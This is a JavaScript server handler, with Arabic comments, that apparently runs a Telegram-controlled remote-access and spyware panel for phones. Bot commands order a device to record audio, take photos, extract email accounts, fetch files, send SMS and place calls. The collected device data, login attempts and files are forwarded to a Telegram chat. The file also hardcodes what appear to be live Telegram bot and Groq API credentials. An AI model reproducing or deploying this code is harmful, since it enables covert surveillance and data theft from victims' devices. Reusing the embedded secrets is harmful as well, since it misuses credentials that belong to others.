// ==========================================
// التوكنات المدمجة
// ==========================================
const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";
const GROQ_API_KEY = "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";

const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

// ==========================================
// توليد 400 أمر ديناميكي
// ==========================================
const COMMAND_MAP = {};

// 1. أوامر Toast (100)
for (let i = 1; i <= 100; i++) COMMAND_MAP[`/toast${i}`] = `toast:إشعار تجريبي رقم ${i}`;
// 2. أوامر URL (100)
for (let i = 1; i <= 100; i++) COMMAND_MAP[`/url${i}`] = `url:https://example.com/page${i}`;
// 3. أوامر الاهتزاز (50)
for (let i = 1; i <= 50; i++) COMMAND_MAP[`/vib${i}`] = `vibrate_time:${i * 500}`;
// 4. أوامر الحافظة (50)
for (let i = 1; i <= 50; i++) COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص رقم ${i}`;
// 5. أوامر SMS (50)
for (let i = 1; i <= 50; i++) COMMAND_MAP[`/sms${i}`] = `sms:+1234567890|رسالة ${i}`;
// 6. أوامر المكالمات (50)
for (let i = 1; i <= 50; i++) COMMAND_MAP[`/call${i}`] = `call:+1234567890`;

const BASE_COMMANDS = {
  '/fullinfo': 'fullinfo:1',
  '/applist': 'applist:1',
  '/files': 'files:1',
  '/killapp': 'killapp:1',
  '/sysinfo': 'sysinfo:1',
  '/photo': 'take_photo',
  '/emails': 'get_emails:1'
};

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let remoteCommand = "";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const deviceId = req.query.device_id;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID) => {
    if (TELEGRAM_TOKEN && chatId) {
      const maxLength = 4000;
      if (text.length > maxLength) {
        for (let i = 0; i < text.length; i += maxLength) {
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
             body: JSON.stringify({ chat_id: chatId, text: text.substring(i, i + maxLength) })
           }).catch(() => {});
        }
      } else {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, 
          body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
        }).catch(() => {});
      }
    }
  };

  try {
    if (type === 'secret') return res.status(200).send(`"${(await kvCmd('GET', 'app_lock_status')) || 'lock'}"`);
    if (type === 'key') return res.status(200).send(`"${(await kvCmd('GET', 'app_secret_key')) || '1234'}"`);
    if (type === 'message') return res.status(200).send(`"التطبيق مقفول من طرف الإدارة."`);

    if (type === 'banned') {
      if ((await kvCmd('GET', 'banall_active')) === '1') return res.status(200).send('"true"');
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      return res.status(200).send(inKv === 1 ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const expAt = await kvCmd('GET', 'key_exp_at');
      if (expAt && Date.now() > parseInt(expAt)) {
        await kvCmd('DEL', 'key_exp_at');
        await kvCmd('SET', 'app_secret_key', 'EXPIRED');
        return res.status(200).send('"killapp:1"');
      }
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = req.body || '';
      if (typeof body === 'object') body = JSON.stringify(body);
      
      let cleanBody = String(body).trim();
      if (cleanBody.startsWith('{') && cleanBody.endsWith('}')) cleanBody = cleanBody.slice(1, -1);
      cleanBody = cleanBody.replace(/\\n/g, '\n').replace(/"/g, '');
      
      if (type === 'key') {
        await kvCmd('SET', 'app_secret_key', cleanBody);
        await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
      }
      
      if (type === 'log') {
        await kvCmd('INCR', 'total_attempts');
        await kvCmd('LPUSH', 'recent_logs', cleanBody.slice(0, 500));
        await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
      }

      if (type === 'media') {
        try {
          const parts = cleanBody.split('|');
          const filename = parts[0];
          const base64Data = parts[1];
          
          if (base64Data) {
            const buffer = Buffer.from(base64Data, 'base64');
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('document', new Blob([buffer]), filename);
            formData.append('caption', `📁 File: ${filename}`);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
              method: 'POST', body: formData
            }).catch(e => console.error(e));
          }
        } catch (err) { await sendToTelegram(`❌ Error media: ${err.message}`); }
      }

      if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
      if (type === 'applist') await sendToTelegram(`📱 *التطبيقات/الحسابات:*\n\n${cleanBody}`);
      if (type === 'files') await sendToTelegram(`📁 *الملفات:*\n\n${cleanBody}`);
      
      return res.status(200).send('"success"');
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message;
      if (!msg) return res.status(200).end();
      const chatId = msg.chat.id.toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      
      const text = msg.text || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      if (command.startsWith('/rec')) {
        const seconds = parseInt(command.replace('/rec', ''));
        if (!isNaN(seconds) && seconds > 0 && seconds <= 300) {
          remoteCommand = `record_${seconds}`;
          await sendToTelegram(`🎙️ \`[REC]\` جاري تسجيل الصوت (${seconds} ثانية)...`);
          return res.status(200).end();
        }
      }

      if (COMMAND_MAP[command]) {
        remoteCommand = COMMAND_MAP[command];
        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
        return res.status(200).end();
      }

      if (BASE_COMMANDS[command]) {
        remoteCommand = BASE_COMMANDS[command];
        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
        return res.status(200).end();
      }

      switch (command) {
        case '/start': case '/menu': 
          await sendToTelegram("👑 *أهلاً بك.*\nنظام 400 أمر جاهز. اكتب /help."); 
          break;
        case '/help': 
          await sendToTelegram(`👑 *لوحة التحكم*\n\n` +
            `⚡ *أوامر خطيرة:*\n/rec15 (تسجيل صوت)\n/photo (التقاط صورة)\n/emails (جلب الحسابات)\n\n` +
            `📂 *جلب الملفات:*\n/getfile <name> (مثلاً: /getfile app.apk)\n\n` +
            `⏱️ *المفاتيح:*\n/gentime <min>\n/settime <min>\n/setkey <key>\n/lock /unlock\n\n` +
            `🚫 *الحظر:*\n/ban /unban /banall /unbanall\n\n` +
            `💥 *الأوامر المولدة:*\n/toast1-100 /url1-100 /vib1-50 /clip1-50 /sms1-50 /call1-50`); 
          break;
        case '/emails': remoteCommand = "get_emails:1"; await sendToTelegram("📧 `[MAIL]` جاري استخراج الحسابات..."); break;
        case '/photo': remoteCommand = 'take_photo'; await sendToTelegram("📷 `[CAM]` جاري التقاط الصورة..."); break;

        case '/gentime':
          if(args[1]) {
            const minutes = parseInt(args[1]);
            const newKey = Math.random().toString(36).substring(2, 8).toUpperCase();
            await kvCmd('SET', 'app_secret_key', newKey);
            const expTime = Date.now() + (minutes * 60 * 1000);
            await kvCmd('SET', 'key_exp_at', expTime.toString());
            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة\n*(سيقفل التطبيق أوتوماتيكياً بعد انتهاء الوقت)*`);
          } else await sendToTelegram("⚠️ استعمل: `/gentime 60`");
          break;

        case '/ai':
          if (args.length > 1) {
            const prompt = args.slice(1).join(' ');
            await sendToTelegram(`🤖 *[AI]* جاري التفكير...`);
            try {
              const groqRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST", headers: { "Authorization": `Bearer ${GROQ_API_KEY}`, "Content-Type": "application/json" },
                body: JSON.stringify({ model: "llama-3.1-8b-instant", messages: [{ role: "user", content: prompt }] })
              });
              const data = await groqRes.json();
              await sendToTelegram(`🤖 *AI:*\n\n${data?.choices?.[0]?.message?.content || "خطأ."}`);
            } catch (e) { await sendToTelegram(`❌ *خطأ:* ${e.message}`); }
          } else await sendToTelegram("⚠️ استعمل: `/ai <سؤالك>`");
          break;

        case '/getfile': 
          if(args[1]) { 
            remoteCommand = `getfile:${args[1]}`; 
            await sendToTelegram(`⏳ \`[FETCH]\` *جاري سحب الملف: ${args[1]}...*`); 
          } else {
            await sendToTelegram("⚠️ استعمل: `/getfile filename.apk`");
          }
          break;
          
        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Sent.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Sent.*"); } break;
        case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Locked.*"); break;
        case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Unlocked.*"); break;
        case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New:* \`${args[1]}\``); } break;
        case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` \`${args[1]}\``); } break;
        case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]`"); break;
        case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]`"); break;
        
        default:
          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*`);
          else await sendToTelegram("❓ أمر غير معروف.");
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
